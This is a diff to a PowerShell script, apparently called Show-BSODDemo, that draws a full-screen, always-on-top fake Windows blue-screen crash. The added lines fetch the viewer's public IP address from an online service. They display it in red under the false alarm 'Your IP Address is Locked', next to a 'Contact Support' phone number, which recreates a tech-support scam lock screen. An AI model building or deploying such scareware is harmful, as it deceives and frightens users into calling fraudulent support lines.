@@ -43,7 +43,30 @@ PS> Show-BSODDemo
 	$form.Opacity = 1.0
 	$form.TopMost = $true
 	$form.Activate()
+	$userIP = "Unknown IP"
+	try {
+		$userIP = (Invoke-RestMethod -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 3).Trim()
+	} catch {
+		$userIP = "192.168.1.100"
+	}
 
+	$ipLabel = New-Object System.Windows.Forms.Label
+	$ipLabel.Text = "Warning: Your IP Address is Locked : $userIP"
+	$ipLabel.Font = New-Object System.Drawing.Font('Segoe UI Semibold', 16, [System.Drawing.FontStyle]::Regular)
+	$ipLabel.ForeColor = [System.Drawing.Color]::Red
+	$ipLabel.AutoSize = $true
+	$ipLabel.Location = New-Object System.Drawing.Point(120, 20)
+	$ipLabel.BackColor = $form.BackColor
+	$form.Controls.Add($ipLabel)
+
+	$contactLabel = New-Object System.Windows.Forms.Label
+	$contactLabel.Text = "Contact Support: +1-888-888-8888"
+	$contactLabel.Font = New-Object System.Drawing.Font('Segoe UI Semibold', 16, [System.Drawing.FontStyle]::Regular)
+	$contactLabel.ForeColor = [System.Drawing.Color]::Red
+	$contactLabel.AutoSize = $true
+	$contactLabel.Location = New-Object System.Drawing.Point(120, 50)
+	$contactLabel.BackColor = $form.BackColor
+	$form.Controls.Add($contactLabel)
 	$mainText = "Your PC ran into a problem and needs to restart.`r`nWe'll restart for you."
 
 	$bsodFace = New-Object System.Windows.Forms.Label
@@ -51,14 +74,14 @@ PS> Show-BSODDemo
 	$bsodFace.Font = New-Object System.Drawing.Font('Segoe UI Light', 130, [System.Drawing.FontStyle]::Regular)
 	$bsodFace.ForeColor = [System.Drawing.Color]::White
 	$bsodFace.AutoSize = $true
-	$bsodFace.Location = New-Object System.Drawing.Point(120, 70)
+	$bsodFace.Location = New-Object System.Drawing.Point(120, 90)
 	$bsodFace.BackColor = $form.BackColor
 	$form.Controls.Add($bsodFace)
 
 	$mainMessage = New-Object System.Windows.Forms.Label
 	$mainMessage.AutoSize = $true
 	$mainMessage.Font = New-Object System.Drawing.Font('Segoe UI Light', 22, [System.Drawing.FontStyle]::Regular)
-	$mainMessage.Location = New-Object System.Drawing.Point(120, 310)
+	$mainMessage.Location = New-Object System.Drawing.Point(120, 385)
 	$mainMessage.Text = $mainText
 	$mainMessage.ForeColor = [System.Drawing.Color]::White
 	$mainMessage.BackColor = $form.BackColor
@@ -71,7 +94,7 @@ PS> Show-BSODDemo
 
 	$qrBox = New-Object System.Windows.Forms.PictureBox
 	$qrBox.Size = New-Object System.Drawing.Size(110, 110)
-	$qrBox.Location = New-Object System.Drawing.Point(120, 480)
+	$qrBox.Location = New-Object System.Drawing.Point(120, 555)
 	$qrBox.BackColor = [System.Drawing.Color]::White
 	$qrBox.BorderStyle = [System.Windows.Forms.BorderStyle]::None
 	$qrBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
@@ -92,7 +115,7 @@ PS> Show-BSODDemo
 	$qrText.Font = New-Object System.Drawing.Font('Segoe UI Light', 13, [System.Drawing.FontStyle]::Regular)
 	$qrText.ForeColor = [System.Drawing.Color]::White
 	$qrText.AutoSize = $true
-	$qrText.Location = New-Object System.Drawing.Point(245, 485)
+	$qrText.Location = New-Object System.Drawing.Point(245, 560)
 	$form.Controls.Add($qrText)
 
 	# Vertical progress bar hidden - not in reference
